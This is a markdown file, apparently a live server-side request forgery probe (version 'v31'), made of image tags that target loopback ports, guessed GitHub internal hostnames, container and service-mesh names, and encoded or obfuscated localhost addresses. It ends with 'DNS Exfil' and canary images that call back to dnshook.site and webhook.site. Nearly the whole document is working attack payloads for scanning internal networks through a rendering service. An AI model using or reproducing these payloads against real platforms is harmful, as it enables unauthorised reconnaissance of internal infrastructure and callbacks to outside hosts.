# Security Research - v31

## Internal Port Scanning & Timing Attacks

Attempting to detect internal services via response timing and error behavior.

---

### 1) Common Internal Ports via 127.0.0.1

Testing if different ports produce different timing/errors:

| Port | Service | Image |
|------|---------|-------|
| 22 | SSH | ![ssh](http://127.0.0.1:22/v31.gif) |
| 80 | HTTP | ![http](http://127.0.0.1:80/v31.gif) |
| 443 | HTTPS | ![https](http://127.0.0.1:443/v31.gif) |
| 3306 | MySQL | ![mysql](http://127.0.0.1:3306/v31.gif) |
| 5432 | PostgreSQL | ![postgres](http://127.0.0.1:5432/v31.gif) |
| 6379 | Redis | ![redis](http://127.0.0.1:6379/v31.gif) |
| 8080 | Alt HTTP | ![alt](http://127.0.0.1:8080/v31.gif) |
| 9200 | Elasticsearch | ![elastic](http://127.0.0.1:9200/v31.gif) |

---

### 2) Common Internal Services via Hostnames

| Host | Image |
|------|-------|
| localhost | ![localhost](http://localhost/v31.gif) |
| localhost:8080 | ![localhost8080](http://localhost:8080/v31.gif) |
| localhost:3000 | ![localhost3000](http://localhost:3000/v31.gif) |

---

### 3) GitHub Internal Hostnames (Guessing)

| Host | Image |
|------|-------|
| api | ![api](http://api/v31.gif) |
| api.github.com | ![api-github](http://api.github.com/v31.gif) |
| internal | ![internal](http://internal/v31.gif) |
| proxy | ![proxy](http://proxy/v31.gif) |
| cache | ![cache](http://cache/v31.gif) |
| redis | ![redis-host](http://redis/v31.gif) |
| db | ![db](http://db/v31.gif) |
| mysql | ![mysql-host](http://mysql/v31.gif) |
| postgres | ![postgres-host](http://postgres/v31.gif) |
| consul | ![consul](http://consul/v31.gif) |
| vault | ![vault](http://vault/v31.gif) |
| kafka | ![kafka](http://kafka/v31.gif) |

---

### 4) Docker/Kubernetes Internal DNS

| Host | Image |
|------|-------|
| host.docker.internal | ![docker-host](http://host.docker.internal/v31.gif) |
| kubernetes | ![k8s](http://kubernetes/v31.gif) |
| kubernetes.default | ![k8s-default](http://kubernetes.default/v31.gif) |
| kube-dns.kube-system | ![kube-dns](http://kube-dns.kube-system/v31.gif) |

---

### 5) Common Sidecar/Mesh Services

| Host | Image |
|------|-------|
| istio-proxy | ![istio](http://istio-proxy/v31.gif) |
| envoy | ![envoy](http://envoy/v31.gif) |
| linkerd-proxy | ![linkerd](http://linkerd-proxy/v31.gif) |

---

### 6) IPv6 Variations

| Address | Image |
|---------|-------|
| [::1] | ![ipv6-1](http://[::1]/v31.gif) |
| [0:0:0:0:0:0:0:1] | ![ipv6-2](http://[0:0:0:0:0:0:0:1]/v31.gif) |
| [::ffff:127.0.0.1] | ![ipv6-3](http://[::ffff:127.0.0.1]/v31.gif) |
| [::ffff:7f00:1] | ![ipv6-4](http://[::ffff:7f00:1]/v31.gif) |

---

### 7) Alternative Localhost Representations

| Format | Image |
|--------|-------|
| 127.1 | ![127-1](http://127.1/v31.gif) |
| 127.0.1 | ![127-0-1](http://127.0.1/v31.gif) |
| 0x7f000001 | ![hex-full](http://0x7f000001/v31.gif) |
| 2130706433 | ![decimal](http://2130706433/v31.gif) |
| 017700000001 | ![octal](http://017700000001/v31.gif) |
| 0177.0.0.01 | ![mixed-octal](http://0177.0.0.01/v31.gif) |

---

### 8) Double URL Encoding

| Encoding | Image |
|----------|-------|
| %31%32%37%2e%30%2e%30%2e%31 | ![encoded](http://%31%32%37%2e%30%2e%30%2e%31/v31.gif) |
| %25%33%31%25%33%32%25%33%37 | ![double](http://%25%33%31%25%33%32%25%33%37/v31.gif) |

---

### 9) URL Authority Confusion

| URL | Image |
|-----|-------|
| //127.0.0.1/v31.gif | ![slash](//127.0.0.1/v31.gif) |
| http://foo@127.0.0.1/v31.gif | ![auth](http://foo@127.0.0.1/v31.gif) |
| http://foo:bar@127.0.0.1/v31.gif | ![userpass](http://foo:bar@127.0.0.1/v31.gif) |

---

### DNS Exfil

![dns](https://v31-dns.70e0ef7c-2cbf-4956-abfc-1295860c6b54.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/70e0ef7c-2cbf-4956-abfc-1295860c6b54/v31-canary.gif)

---

*v31 - Internal port scanning & timing attacks*
